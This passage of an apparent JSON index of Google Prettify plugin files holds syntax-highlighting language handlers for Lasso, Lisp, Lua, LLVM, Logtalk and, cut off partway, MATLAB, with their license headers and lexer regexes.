/^~[A-Z](?:\\((?:[^\\)\\r\\n\\\\]|\\\\.)+\\)|\\[(?:[^\\]\\r\\n\\\\]|\\\\.)+\\]|\\{(?:[^\\}\\r\\n\\\\]|\\\\.)+\\}|\\\\r\\n\\\\]|\\\\.)+\\>)[A-Z]*/i], [PR['PR_PUNCTUATION'], /^(?:\\.+|\\/|[:~])/] ]), ['ex','exs']);","link":"/plugins/prettify/lang-ex.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Eric Knibbe * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Lasso. * * To use, include prettify.js and this file in your HTML page. * Then enclose your code in an HTML tag like so: * [your Lasso code] * * @author Eric Knibbe */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // single quote strings [PR['PR_STRING'], /^\\'[^\\'\\\\]*(?:\\\\[\\s\\S][^\\'\\\\]*)*(?:\\'|$)/, null, \"'\"], // double quote strings [PR['PR_STRING'], /^\\\"[^\\\"\\\\]*(?:\\\\[\\s\\S][^\\\"\\\\]*)*(?:\\\"|$)/, null, '\"'], // ticked strings [PR['PR_STRING'], /^\\`[^\\`]*(?:\\`|$)/, null, '`'], // numeral as integer or hexidecimal [PR['PR_LITERAL'], /^0x[\\da-f]+|\\d+/i, null, '0123456789'], // local or thread variables, or hashbang [PR['PR_ATTRIB_NAME'], /^[#$][a-z_][\\w.]*|#\\d+\\b|#![ \\S]+lasso9\\b/i, null, '#$'] ], [ // square or angle bracket delimiters [PR['PR_TAG'], /^[[\\]]||(no_square_brackets|noprocess)\\b/i], // single-line or block comments [PR['PR_COMMENT'], /^\\/\\/[^\\r\\n]*|\\/\\*[\\s\\S]*?\\*\\//], // member variables or keyword parameters [PR['PR_ATTRIB_NAME'], /^-(?!infinity)[a-z_][\\w.]*|\\.\\s*'[a-z_][\\w.]*'|\\.{3}/i], // numeral as decimal or scientific notation [PR['PR_LITERAL'], /^\\d*\\.\\d+(?:e[-+]?\\d+)?|(infinity|NaN)\\b/i], // tag literals [PR['PR_ATTRIB_VALUE'], /^::\\s*[a-z_][\\w.]*/i], // constants [PR['PR_LITERAL'], /^(?:true|false|none|minimal|full|all|void|and|or|not|bw|nbw|ew|new|cn|ncn|lt|lte|gt|gte|eq|neq|rx|nrx|ft)\\b/i], // standard type or variable declarations [PR['PR_TYPE'], /^(?:array|date|decimal|duration|integer|map|pair|string|tag|xml|null|boolean|bytes|keyword|list|locale|queue|set|stack|staticarray|local|var|variable|global|data|self|inherited|currentcapture|givenblock)\\b|^\\.\\.?/i], // container or control keywords [PR['PR_KEYWORD'], /^(?:cache|database_names|database_schemanames|database_tablenames|define_tag|define_type|email_batch|encode_set|html_comment|handle|handle_error|header|if|inline|iterate|ljax_target|link|link_currentaction|link_currentgroup|link_currentrecord|link_detail|link_firstgroup|link_firstrecord|link_lastgroup|link_lastrecord|link_nextgroup|link_nextrecord|link_prevgroup|link_prevrecord|log|loop|namespace_using|output_none|portal|private|protect|records|referer|referrer|repeating|resultset|rows|search_args|search_arguments|select|sort_args|sort_arguments|thread_atomic|value_list|while|abort|case|else|fail_if|fail_ifnot|fail|if_empty|if_false|if_null|if_true|loop_abort|loop_continue|loop_count|params|params_up|return|return_value|run_children|soap_definetag|soap_lastrequest|soap_lastresponse|tag_name|ascending|average|by|define|descending|do|equals|frozen|group|handle_failure|import|in|into|join|let|match|max|min|on|order|parent|protected|provide|public|require|returnhome|skip|split_thread|sum|take|thread|to|trait|type|where|with|yield|yieldhome)\\b/i], // type, method, or parameter names [PR['PR_PLAIN'], /^[a-z_][\\w.]*(?:=\\s*(?=\\())?/i], // operators [PR['PR_PUNCTUATION'], /^:=|[-+*\\/%=&|!?\\\\]+/] ]), ['lasso', 'ls', 'lassoscript']);","link":"/plugins/prettify/lang-lasso.js"},{"title":"","text":"/** * @license * Copyright (C) 2008 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Common Lisp and related languages. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my lisp code) * The lang-cl class identifies the language as common lisp. * This file supports the following language extensions: * lang-cl - Common Lisp * lang-el - Emacs Lisp * lang-lisp - Lisp * lang-scm - Scheme * lang-lsp - FAT 8.3 filename version of lang-lisp. * * * I used http://www.devincook.com/goldparser/doc/meta-language/grammar-LISP.htm * as the basis, but added line comments that start with ; and changed the atom * production to disallow unquoted semicolons. * * \"Name\" = 'LISP' * \"Author\" = 'John McCarthy' * \"Version\" = 'Minimal' * \"About\" = 'LISP is an abstract language that organizes ALL' * | 'data around \"lists\".' * * \"Start Symbol\" = [s-Expression] * * {Atom Char} = {Printable} - {Whitespace} - [()\"\\''] * * Atom = ( {Atom Char} | '\\'{Printable} )+ * * [s-Expression] ::= [Quote] Atom * | [Quote] '(' [Series] ')' * | [Quote] '(' [s-Expression] '.' [s-Expression] ')' * * [Series] ::= [s-Expression] [Series] * | * * [Quote] ::= '' !Quote = do not evaluate * | * * * I used Practical Common Lisp as * the basis for the reserved word list. * * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ ['opn', /^\\(+/, null, '('], ['clo', /^\\)+/, null, ')'], // A line comment that starts with ; [PR['PR_COMMENT'], /^;[^\\r\\n]*/, null, ';'], // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'] ], [ [PR['PR_KEYWORD'], /^(?:block|c[ad]+r|catch|con[ds]|def(?:ine|un)|do|eq|eql|equal|equalp|eval-when|flet|format|go|if|labels|lambda|let|load-time-value|locally|macrolet|multiple-value-call|nil|progn|progv|quote|require|return-from|setq|symbol-macrolet|t|tagbody|the|throw|unwind)\\b/, null], [PR['PR_LITERAL'], /^[+\\-]?(?:[0#]x[0-9a-f]+|\\d+\\/\\d+|(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:[ed][+\\-]?\\d+)?)/i], // A single quote possibly followed by a word that optionally ends with // = ! or ?. [PR['PR_LITERAL'], /^\\'(?:-*(?:\\w|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?)?/], // A word that optionally ends with = ! or ?. [PR['PR_PLAIN'], /^-*(?:[a-z_]|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?/i], // A printable non-space non-special character [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0()\\\"\\\\\\';]+/] ]), ['cl', 'el', 'lisp', 'lsp', 'scm', 'ss', 'rkt']);","link":"/plugins/prettify/lang-lisp.js"},{"title":"","text":"/** * @license * Copyright (C) 2008 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Lua. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my Lua code) * * * I used http://www.lua.org/manual/5.1/manual.html#2.1 * Because of the long-bracket concept used in strings and comments, Lua does * not have a regular lexical grammar, but luckily it fits within the space * of irregular grammars supported by javascript regular expressions. * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double or single quoted, possibly multi-line, string. [PR['PR_STRING'], /^(?:\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)|\\'(?:[^\\'\\\\]|\\\\[\\s\\S])*(?:\\'|$))/, null, '\"\\''] ], [ // A comment is either a line comment that starts with two dashes, or // two dashes preceding a long bracketed block. [PR['PR_COMMENT'], /^--(?:\\[(=*)\\[[\\s\\S]*?(?:\\]\\1\\]|$)|[^\\r\\n]*)/], // A long bracketed block not preceded by -- is a string. [PR['PR_STRING'], /^\\[(=*)\\[[\\s\\S]*?(?:\\]\\1\\]|$)/], [PR['PR_KEYWORD'], /^(?:and|break|do|else|elseif|end|false|for|function|if|in|local|nil|not|or|repeat|return|then|true|until|while)\\b/, null], // A number is a hex integer literal, a decimal real literal, or in // scientific notation. [PR['PR_LITERAL'], /^[+-]?(?:0x[\\da-f]+|(?:(?:\\.\\d+|\\d+(?:\\.\\d*)?)(?:e[+\\-]?\\d+)?))/i], // An identifier [PR['PR_PLAIN'], /^[a-z_]\\w*/i], // A run of punctuation [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0][^\\w\\t\\n\\r \\xA0\\\"\\'\\-\\+=]*/] ]), ['lua']);","link":"/plugins/prettify/lang-lua.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Nikhil Dabas * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for LLVM. * From https://gist.github.com/ndabas/2850418 * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my LLVM code) * * * The regular expressions were adapted from: * https://github.com/hansstimer/llvm.tmbundle/blob/76fedd8f50fd6108b1780c51d79fbe3223de5f34/Syntaxes/LLVM.tmLanguage * * http://llvm.org/docs/LangRef.html#constants describes the language grammar. * * @author Nikhil Dabas */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^!?\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], // comment.llvm [PR['PR_COMMENT'], /^;[^\\r\\n]*/, null, ';'] ], [ // variable.llvm [PR['PR_PLAIN'], /^[%@!](?:[-a-zA-Z$._][-a-zA-Z$._0-9]*|\\d+)/], // According to http://llvm.org/docs/LangRef.html#well-formedness // These reserved words cannot conflict with variable names, because none of them start with a prefix character ('%' or '@'). [PR['PR_KEYWORD'], /^[A-Za-z_][0-9A-Za-z_]*/, null], // constant.numeric.float.llvm [PR['PR_LITERAL'], /^\\d+\\.\\d+/], // constant.numeric.integer.llvm [PR['PR_LITERAL'], /^(?:\\d+|0[xX][a-fA-F0-9]+)/], // punctuation [PR['PR_PUNCTUATION'], /^[()\\[\\]{},=*:]|\\.\\.\\.$/] ]), ['llvm', 'll']);","link":"/plugins/prettify/lang-llvm.js"},{"title":"","text":"/** * @license * Copyright (C) 2014 Paulo Moura * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Logtalk. * http://logtalk.org/ * @author Paulo Moura */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // double-quoted strings. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\\\n\\x0C\\r]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], // atoms (don't break on underscores!) [PR['PR_LITERAL'], /^[a-z][a-zA-Z0-9_]*/], // quoted atoms [PR['PR_LITERAL'], /^\\'(?:[^\\'\\\\\\n\\x0C\\r]|\\\\[^&])+\\'?/, null, \"'\"], // numbers [PR['PR_LITERAL'], /^(?:0'.|0b[0-1]+|0o[0-7]+|0x[\\da-f]+|\\d+(?:\\.\\d+)?(?:e[+\\-]?\\d+)?)/i, null, '0123456789'] ], [ // single-line comments begin with % [PR['PR_COMMENT'], /^%[^\\r\\n]*/, null, '%'], // block comments are delimited by /* and */ [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?\\*\\//], // directives [PR['PR_KEYWORD'], /^\\s*:-\\s(c(a(lls|tegory)|oinductive)|p(ublic|r(ot(ocol|ected)|ivate))|e(l(if|se)|n(coding|sure_loaded)|xport)|i(f|n(clude|itialization|fo))|alias|d(ynamic|iscontiguous)|m(eta_(non_terminal|predicate)|od(e|ule)|ultifile)|reexport|s(et_(logtalk|prolog)_flag|ynchronized)|o(bject|p)|use(s|_module))/], [PR['PR_KEYWORD'], /^\\s*:-\\s(e(lse|nd(if|_(category|object|protocol)))|built_in|dynamic|synchronized|threaded)/], // variables [PR['PR_TYPE'], /^[A-Z_][a-zA-Z0-9_]*/], // operators [PR['PR_PUNCTUATION'], /^[.,;{}:^=\\\\/+*?#!-]/] ]), ['logtalk', 'lgt']);","link":"/plugins/prettify/lang-logtalk.js"},{"title":"","text":"/** * @license * Copyright (c) 2013 by Amro * * Permission is hereby granted, free of charge, to any person obtaining a copy * of this software and associated documentation files (the \"Software\"), to deal * in the Software without restriction, including without limitation the rights * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell * copies of the Software, and to permit persons to whom the Software is * furnished to do so, subject to the following conditions: * * The above copyright notice and this permission notice shall be included in * all copies or substantial portions of the Software. * * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN * THE SOFTWARE. */ /** * @fileoverview * Registers a language handler for MATLAB. * * To use, include prettify.js and this file in your HTML page. * Then put your code inside an HTML tag like * * * * @see https://github.com/amroamroamro/prettify-matlab */ (function (PR) { /* PR_PLAIN: plain text PR_STRING: string literals PR_KEYWORD: keywords PR_COMMENT: comments PR_TYPE: types PR_LITERAL: literal values (1, null, true, ..) PR_PUNCTUATION: punctuation string PR_SOURCE: embedded source PR_DECLARATION: markup declaration such as a DOCTYPE PR_TAG: sgml tag PR_ATTRIB_NAME: sgml attribute name PR_ATTRIB_VALUE: sgml attribute value */ var PR_IDENTIFIER = \"ident\", PR_CONSTANT = \"const\", PR_FUNCTION = \"fun\", PR_FUNCTION_TOOLBOX = \"fun_tbx\", PR_SYSCMD = \"syscmd\", PR_CODE_OUTPUT = \"codeoutput\", PR_ERROR = \"err\", PR_WARNING = \"wrn\", PR_TRANSPOSE = \"transpose\", PR_LINE_CONTINUATION = \"linecont\"; // Refer to: http://www.mathworks.com/help/matlab/functionlist-alpha.html var coreFunctions = [ 'abs|accumarray|acos(?:d|h)?|acot(?:d|h)?|acsc(?:d|h)?|actxcontrol(?:list|select)?|actxGetRunningServer|actxserver|addlistener|addpath|addpref|addtodate|airy|align|alim|all|allchild|alpha|alphamap|amd|ancestor|and|angle|annotation|any|area|arrayfun|asec(?:d|h)?|asin(?:d|h)?|assert|assignin|atan(?:2|d|h)?|audiodevinfo|audioplayer|audiorecorder|aufinfo|auread|autumn|auwrite|avifile|aviinfo|aviread|axes|axis|balance|bar(?:3|3h|h)?|base2dec|beep|BeginInvoke|bench|bessel(?:h|i|j|k|y)|beta|betainc|betaincinv|betaln|bicg|bicgstab|bicgstabl|bin2dec|bitand|bitcmp|bitget|bitmax|bitnot|bitor|bitset|bitshift|bitxor|blanks|blkdiag|bone|box|brighten|brush|bsxfun|builddocsearchdb|builtin|bvp4c|bvp5c|bvpget|bvpinit|bvpset|bvpxtend|calendar|calllib|callSoapService|camdolly|cameratoolbar|camlight|camlookat|camorbit|campan|campos|camproj|camroll|camtarget|camup|camva|camzoom|cart2pol|cart2sph|cast|cat|caxis|cd|cdf2rdf|cdfepoch|cdfinfo|cdflib(?:\\.(?:close|closeVar|computeEpoch|computeEpoch16|create|createAttr|createVar|delete|deleteAttr|deleteAttrEntry|deleteAttrgEntry|deleteVar|deleteVarRecords|epoch16Breakdown|epochBreakdown|getAttrEntry|getAttrgEntry|getAttrMaxEntry|getAttrMaxgEntry|getAttrName|getAttrNum|getAttrScope|getCacheSize|getChecksum|getCompression|getCompressionCacheSize|getConstantNames|getConstantValue|getCopyright|getFileBackward|getFormat|getLibraryCopyright|getLibraryVersion|getMajority|getName|getNumAttrEntries|getNumAttrgEntries|getNumAttributes|getNumgAttributes|getReadOnlyMode|getStageCacheSize|getValidate|getVarAllocRecords|getVarBlockingFactor|getVarCacheSize|getVarCompression|getVarData|getVarMaxAllocRecNum|getVarMaxWrittenRecNum|getVarName|getVarNum|getVarNumRecsWritten|getVarPadValue|getVarRecordData|getVarReservePercent|getVarsMaxWrittenRecNum|getVarSparseRecords|getVersion|hyperGetVarData|hyperPutVarData|inquire|inquireAttr|inquireAttrEntry|inquireAttrgEntry|inquireVar|open|putAttrEntry|putAttrgEntry|putVarData|putVarRecordData|renameAttr|renameVar|setCacheSize|setChecksum|setCompression|setCompressionCacheSize|setFileBackward|setFormat|setMajority|setReadOnlyMode|setStageCacheSize|setValidate|setVarAllocBlockRecords|setVarBlockingFactor|setVarCacheSize|setVarCompression|setVarInitialRecs|setVarPadValue|SetVarReservePercent|setVarsCacheSize|setVarSparseRecords))?|cdfread|cdfwrite|ceil|cell2mat|cell2struct|celldisp|cellfun|cellplot|cellstr|cgs|checkcode|checkin|checkout|chol|cholinc|cholupdate|circshift|cla|clabel|class|clc|clear|clearvars|clf|clipboard|clock|close|closereq|cmopts|cmpermute|cmunique|colamd|colon|colorbar|colordef|colormap|colormapeditor|colperm|Combine|comet|comet3|commandhistory|commandwindow|compan|compass|complex|computer|cond|condeig|condest|coneplot|conj|containers\\.Map|contour(?:3|c|f|slice)?|contrast|conv|conv2|convhull|convhulln|convn|cool|copper|copyfile|copyobj|corrcoef|cos(?:d|h)?|cot(?:d|h)?|cov|cplxpair|cputime|createClassFromWsdl|createSoapMessage|cross|csc(?:d|h)?|csvread|csvwrite|ctranspose|cumprod|cumsum|cumtrapz|curl|customverctrl|cylinder|daqread|daspect|datacursormode|datatipinfo|date|datenum|datestr|datetick|datevec|dbclear|dbcont|dbdown|dblquad|dbmex|dbquit|dbstack|dbstatus|dbstep|dbstop|dbtype|dbup|dde23|ddeget|ddesd|ddeset|deal|deblank|dec2base|dec2bin|dec2hex|decic|deconv|del2|delaunay|delaunay3|delaunayn|DelaunayTri|delete|demo|depdir|depfun|det|detrend|deval|diag|dialog|diary|diff|diffuse|dir|disp|display|dither|divergence|dlmread|dlmwrite|dmperm|doc|docsearch|dos|dot|dragrect|drawnow|dsearch|dsearchn|dynamicprops|echo|echodemo|edit|eig|eigs|ellipj|ellipke|ellipsoid|empty|enableNETfromNetworkDrive|enableservice|EndInvoke|enumeration|eomday|eq|erf|erfc|erfcinv|erfcx|erfinv|error|errorbar|errordlg|etime|etree|etreeplot|eval|evalc|evalin|event\\.(?:EventData|listener|PropertyEvent|proplistener)|exifread|exist|exit|exp|expint|expm|expm1|export2wsdlg|eye|ezcontour|ezcontourf|ezmesh|ezmeshc|ezplot|ezplot3|ezpolar|ezsurf|ezsurfc|factor|factorial|fclose|feather|feature|feof|ferror|feval|fft|fft2|fftn|fftshift|fftw|fgetl|fgets|fieldnames|figure|figurepalette|fileattrib|filebrowser|filemarker|fileparts|fileread|filesep|fill|fill3|filter|filter2|find|findall|findfigs|findobj|findstr|finish|fitsdisp|fitsinfo|fitsread|fitswrite|fix|flag|flipdim|fliplr|flipud|floor|flow|fminbnd|fminsearch|fopen|format|fplot|fprintf|frame2im|fread|freqspace|frewind|fscanf|fseek|ftell|FTP|full|fullfile|func2str|functions|funm|fwrite|fzero|gallery|gamma|gammainc|gammaincinv|gammaln|gca|gcbf|gcbo|gcd|gcf|gco|ge|genpath|genvarname|get|getappdata|getenv|getfield|getframe|getpixelposition|getpref|ginput|gmres|gplot|grabcode|gradient|gray|graymon|grid|griddata(?:3|n)?|griddedInterpolant|gsvd|gt|gtext|guidata|guide|guihandles|gunzip|gzip|h5create|h5disp|h5info|h5read|h5readatt|h5write|h5writeatt|hadamard|handle|hankel|hdf|hdf5|hdf5info|hdf5read|hdf5write|hdfinfo|hdfread|hdftool|help|helpbrowser|helpdesk|helpdlg|helpwin|hess|hex2dec|hex2num|hgexport|hggroup|hgload|hgsave|hgsetget|hgtransform|hidden|hilb|hist|histc|hold|home|horzcat|hostid|hot|hsv|hsv2rgb|hypot|ichol|idivide|ifft|ifft2|ifftn|ifftshift|ilu|im2frame|im2java|imag|image|imagesc|imapprox|imfinfo|imformats|import|importdata|imread|imwrite|ind2rgb|ind2sub|inferiorto|info|inline|inmem|inpolygon|input|inputdlg|inputname|inputParser|inspect|instrcallback|instrfind|instrfindall|int2str|integral(?:2|3)?|interp(?:1|1q|2|3|ft|n)|interpstreamspeed|intersect|intmax|intmin|inv|invhilb|ipermute|isa|isappdata|iscell|iscellstr|ischar|iscolumn|isdir|isempty|isequal|isequaln|isequalwithequalnans|isfield|isfinite|isfloat|isglobal|ishandle|ishghandle|ishold|isinf|isinteger|isjava|iskeyword|isletter|islogical|ismac|ismatrix|ismember|ismethod|isnan|isnumeric|isobject|isocaps|isocolors|isonormals|isosurface|ispc|ispref|isprime|isprop|isreal|isrow|isscalar|issorted|isspace|issparse|isstr|isstrprop|isstruct|isstudent|isunix|isvarname|isvector|javaaddpath|javaArray|javachk|javaclasspath|javacomponent|javaMethod|javaMethodEDT|javaObject|javaObjectEDT|javarmpath|jet|keyboard|kron|lasterr|lasterror|lastwarn|lcm|ldivide|ldl|le|legend|legendre|length|libfunctions|libfunctionsview|libisloaded|libpointer|libstruct|license|light|lightangle|lighting|lin2mu|line|lines|linkaxes|linkdata|linkprop|linsolve|linspace|listdlg|listfonts|load|loadlibrary|loadobj|log|log10|log1p|log2|loglog|logm|logspace|lookfor|lower|ls|lscov|lsqnonneg|lsqr|lt|lu|luinc|magic|makehgtform|mat2cell|mat2str|material|matfile|matlab\\.io\\.MatFile|matlab\\.mixin\\.(?:Copyable|Heterogeneous(?:\\.getDefaultScalarElement)?)|matlabrc|matlabroot|max|maxNumCompThreads|mean|median|membrane|memmapfile|memory|menu|mesh|meshc|meshgrid|meshz|meta\\.(?:class(?:\\.fromName)?|DynamicProperty|EnumeratedValue|event|MetaData|method|package(?:\\.(?:fromName|getAllPackages))?|property)|metaclass|methods|methodsview|mex(?:\\.getCompilerConfigurations)?|MException|mexext|mfilename|min|minres|minus|mislocked|mkdir|mkpp|mldivide|mlint|mlintrpt|mlock|mmfileinfo|mmreader|mod|mode|more|move|movefile|movegui|movie|movie2avi|mpower|mrdivide|msgbox|mtimes|mu2lin|multibandread|multibandwrite|munlock|namelengthmax|nargchk|narginchk|nargoutchk|native2unicode|nccreate|ncdisp|nchoosek|ncinfo|ncread|ncreadatt|ncwrite|ncwriteatt|ncwriteschema|ndgrid|ndims|ne|NET(?:\\.(?:addAssembly|Assembly|convertArray|createArray|createGeneric|disableAutoRelease|enableAutoRelease|GenericClass|invokeGenericMethod|NetException|setStaticProperty))?|netcdf\\.(?:abort|close|copyAtt|create|defDim|defGrp|defVar|defVarChunking|defVarDeflate|defVarFill|defVarFletcher32|delAtt|endDef|getAtt|getChunkCache|getConstant|getConstantNames|getVar|inq|inqAtt|inqAttID|inqAttName|inqDim|inqDimID|inqDimIDs|inqFormat|inqGrpName|inqGrpNameFull|inqGrpParent|inqGrps|inqLibVers|inqNcid|inqUnlimDims|inqVar|inqVarChunking|inqVarDeflate|inqVarFill|inqVarFletcher32|inqVarID|inqVarIDs|open|putAtt|putVar|reDef|renameAtt|renameDim|renameVar|setChunkCache|setDefaultFormat|setFill|sync)|newplot|nextpow2|nnz|noanimate|nonzeros|norm|normest|not|notebook|now|nthroot|null|num2cell|num2hex|num2str|numel|nzmax|ode(?:113|15i|15s|23|23s|23t|23tb|45)|odeget|odeset|odextend|onCleanup|ones|open|openfig|opengl|openvar|optimget|optimset|or|ordeig|orderfields|ordqz|ordschur|orient|orth|pack|padecoef|pagesetupdlg|pan|pareto|parseSoapResponse|pascal|patch|path|path2rc|pathsep|pathtool|pause|pbaspect|pcg|pchip|pcode|pcolor|pdepe|pdeval|peaks|perl|perms|permute|pie|pink|pinv|planerot|playshow|plot|plot3|plotbrowser|plotedit|plotmatrix|plottools|plotyy|plus|pol2cart|polar|poly|polyarea|polyder|polyeig|polyfit|polyint|polyval|polyvalm|pow2|power|ppval|prefdir|preferences|primes|print|printdlg|printopt|printpreview|prod|profile|profsave|propedit|propertyeditor|psi|publish|PutCharArray|PutFullMatrix|PutWorkspaceData|pwd|qhull|qmr|qr|qrdelete|qrinsert|qrupdate|quad|quad2d|quadgk|quadl|quadv|questdlg|quit|quiver|quiver3|qz|rand|randi|randn|randperm|RandStream(?:\\.(?:create|getDefaultStream|getGlobalStream|list|setDefaultStream|setGlobalStream))?|rank|rat|rats|rbbox|rcond|rdivide|readasync|real|reallog|realmax|realmin|realpow|realsqrt|record|rectangle|rectint|recycle|reducepatch|reducevolume|refresh|refreshdata|regexp|regexpi|regexprep|regexptranslate|rehash|rem|Remove|RemoveAll|repmat|reset|reshape|residue|restoredefaultpath|rethrow|rgb2hsv|rgb2ind|rgbplot|ribbon|rmappdata|rmdir|rmfield|rmpath|rmpref|rng|roots|rose|rosser|rot90|rotate|rotate3d|round|rref|rsf2csf|run|save|saveas|saveobj|savepath|scatter|scatter3|schur|sec|secd|sech|selectmoveresize|semilogx|semilogy|sendmail|serial|set|setappdata|setdiff|setenv|setfield|setpixelposition|setpref|setstr|setxor|shading|shg|shiftdim|showplottool|shrinkfaces|sign|sin(?:d|h)?|size|slice|smooth3|snapnow|sort|sortrows|sound|soundsc|spalloc|spaugment|spconvert|spdiags|specular|speye|spfun|sph2cart|sphere|spinmap|spline|spones|spparms|sprand|sprandn|sprandsym|sprank|spring|sprintf|spy|sqrt|sqrtm|squeeze|ss2tf|sscanf|stairs|startup|std|stem|stem3|stopasync|str2double|str2func|str2mat|str2num|strcat|strcmp|strcmpi|stream2|stream3|streamline|streamparticles|streamribbon|streamslice|streamtube|strfind|strjust|strmatch|strncmp|strncmpi|strread|strrep|strtok|strtrim|struct2cell|structfun|strvcat|sub2ind|subplot|subsasgn|subsindex|subspace|subsref|substruct|subvolume|sum|summer|superclasses|superiorto|support|surf|surf2patch|surface|surfc|surfl|surfnorm|svd|svds|swapbytes|symamd|symbfact|symmlq|symrcm|symvar|system|tan(?:d|h)?|tar|tempdir|tempname|tetramesh|texlabel|text|textread|textscan|textwrap|tfqmr|throw|tic|Tiff(?:\\.(?:getTagNames|getVersion))?|timer|timerfind|timerfindall|times|timeseries|title|toc|todatenum|toeplitz|toolboxdir|trace|transpose|trapz|treelayout|treeplot|tril|trimesh|triplequad|triplot|TriRep|TriScatteredInterp|trisurf|triu|tscollection|tsearch|tsearchn|tstool|type|typecast|uibuttongroup|uicontextmenu|uicontrol|uigetdir|uigetfile|uigetpref|uiimport|uimenu|uiopen|uipanel|uipushtool|uiputfile|uiresume|uisave|uisetcolor|uisetfont|uisetpref|uistack|uitable|uitoggletool|uitoolbar|uiwait|uminus|undocheckout|unicode2native|union|unique|unix|unloadlibrary|unmesh|unmkpp|untar|unwrap|unzip|uplus|upper|urlread|urlwrite|usejava|userpath|validateattributes|validatestring|vander|var|vectorize|ver|verctrl|verLessThan|version|vertcat|VideoReader(?:\\.isPlatformSupported)?|VideoWriter(?:\\.getProfiles)?|view|viewmtx|visdiff|volumebounds|voronoi|voronoin|wait|waitbar|waitfor|waitforbuttonpress|warndlg|warning|waterfall|wavfinfo|wavplay|wavread|wavrecord|wavwrite|web|weekday|what|whatsnew|which|whitebg|who|whos|wilkinson|winopen|winqueryreg|winter|wk1finfo|wk1read|wk1write|workspace|xlabel|xlim|xlsfinfo|xlsread|xlswrite|xmlread|xmlwrite|xor|xslt|ylabel|ylim|zeros|zip|zlabel|zlim|zoom' ].join(\"|\"); var statsFunctions = [ 